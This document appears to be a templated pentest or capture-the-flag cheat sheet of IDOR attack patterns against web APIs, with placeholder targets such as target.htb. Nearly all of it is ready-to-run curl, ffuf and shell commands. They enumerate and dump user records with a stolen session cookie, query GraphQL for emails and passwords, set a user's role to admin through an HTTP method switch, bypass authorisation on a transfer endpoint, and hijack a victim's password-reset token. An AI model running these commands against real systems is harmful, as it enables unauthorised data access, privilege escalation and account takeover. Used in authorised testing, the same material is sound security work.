# IDOR Patterns

> Insecure Direct Object Reference — enumeration, fuzzing, and exploit patterns

<!-- tags: idor, web, authz, enumeration, exploit -->

---

## enum idor numeric ids
Enumerate sequential resource IDs.

```bash
for i in $(seq 1 1000); do code=$(curl -s -o /dev/null -w "%{http_code}" "{{URL:url:http://target.htb/api/users/}}$i" -b "session={{COOKIE:str:abc123}}"); [ "$code" = "200" ] && echo "ID $i: $code"; done
```

<!-- meta: risk=med | phase=enum | tags=idor,numeric -->

---

## dump idor numeric records
Pull each ID and look for sensitive fields.

```bash
for i in $(seq 1 100); do echo "=== $i ==="; curl -s "{{URL:url:http://target.htb/api/users/}}$i" -b "session={{COOKIE:str:abc123}}"; done
```

<!-- meta: risk=med | phase=exploit | tags=idor,enum -->

---

## enum idor uuids wayback
Hunt UUIDs in archived URLs / source.

```bash
curl -s "https://web.archive.org/cdx/search/cdx?url={{DOMAIN:domain:target.htb}}/*&output=text&fl=original" | grep -oE '[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}' | sort -u
```

<!-- meta: risk=safe | phase=recon | tags=idor,uuid,wayback -->

---

## dump idor graphql record
Fetch arbitrary record by ID.

```bash
curl -s -X POST {{URL:url:http://target.htb/graphql}} -H "Content-Type: application/json" -d '{"query":"{ user(id:{{ID:int:1}}) { id email password isAdmin } }"}'
```

<!-- meta: risk=med | phase=exploit | tags=idor,graphql -->

---

## enum idor burp intruder
Use Burp Intruder Sniper / Pitchfork on the ID parameter.

```bash
echo "1. Send request to Intruder. 2. Mark id parameter. 3. Payload: numbers 1-10000. 4. Sort response length."
```

<!-- meta: risk=safe | phase=exploit | tags=idor,burp -->

---

## bypass idor method switch
Sometimes only POST/PUT is auth-checked, GET is not.

```bash
curl -s -X GET "{{URL:url:http://target.htb/api/admin/user/}}1"
curl -s -X PUT "{{URL:url:http://target.htb/api/admin/user/}}1" -d '{"role":"admin"}' -H "Content-Type: application/json"
```

<!-- meta: risk=med | phase=exploit | tags=idor,methodswitch -->

---

## bypass idor traversal ids
Try traversal-style values.

```bash
echo "../1\n..%2f1\n%00admin\n0\n-1\n9999999"
```

<!-- meta: risk=med | phase=exploit | tags=idor,traversal -->

---

## inject idor extra params
Try adding parameters not normally sent.

```bash
curl -s "{{URL:url:http://target.htb/api/profile}}?user_id={{ID:int:1}}&id={{ID:int:1}}&uid={{ID:int:1}}&account={{ID:int:1}}"
```

<!-- meta: risk=med | phase=exploit | tags=idor,paramadd -->

---

## bypass idor array wrap
Wrap ID in array — backend may pick first.

```bash
curl -s -X POST {{URL:url:http://target.htb/api/transfer}} -H "Content-Type: application/json" -d '{"id":["{{TARGET_ID:int:2}}","{{MY_ID:int:1}}"]}'
```

<!-- meta: risk=high | phase=exploit | tags=idor,array,bypass -->

---

## bypass idor wildcard
Some APIs accept * to return all.

```bash
curl -s "{{URL:url:http://target.htb/api/users/*}}"
curl -s "{{URL:url:http://target.htb/api/users?id=*}}"
```

<!-- meta: risk=med | phase=exploit | tags=idor,wildcard -->

---

## bypass idor content type
Switching content-types may hit different validation.

```bash
curl -s -X POST {{URL:url:http://target.htb/api/transfer}} -H "Content-Type: application/json" -d '{"id":2}'
curl -s -X POST {{URL:url:http://target.htb/api/transfer}} -H "Content-Type: application/x-www-form-urlencoded" -d "id=2"
curl -s -X POST {{URL:url:http://target.htb/api/transfer}} -H "Content-Type: application/xml" -d '<?xml version="1.0"?><req><id>2</id></req>'
```

<!-- meta: risk=med | phase=exploit | tags=idor,contenttype -->

---

## fuzz idor admin endpoints
Discover hidden admin endpoints with auth.

```bash
ffuf -u {{URL:url:http://target.htb/}}FUZZ -w {{WORDLIST:wordlist:/usr/share/seclists/Discovery/Web-Content/admin-panels.txt}} -b "session={{COOKIE:str:abc123}}" -fc 401,403,404
```

<!-- meta: risk=safe | phase=enum | tags=idor,forcebrowse -->

---

## decode idor hashed ids
Some APIs use hashed/encoded IDs — try common decodings.

```bash
echo "1" | base64
echo "MQ==" | base64 -d
echo -n "1" | md5sum
```

<!-- meta: risk=safe | phase=enum | tags=idor,hash,encoding -->

---

## hijack idor reset token
Request reset for victim, see if response includes token.

```bash
curl -s -X POST {{URL:url:http://target.htb/forgot}} -d "email={{EMAIL:str:victim@target.htb}}" -i
```

<!-- meta: risk=high | phase=exploit | tags=idor,reset -->

---

## diff idor responses
Diff two requests with same auth but different IDs.

```bash
curl -s "{{URL:url:http://target.htb/api/orders/}}1" -b "s=ABC" > /tmp/r1
curl -s "{{URL:url:http://target.htb/api/orders/}}2" -b "s=ABC" > /tmp/r2
diff /tmp/r1 /tmp/r2
```

<!-- meta: risk=safe | phase=enum | tags=idor,diff -->
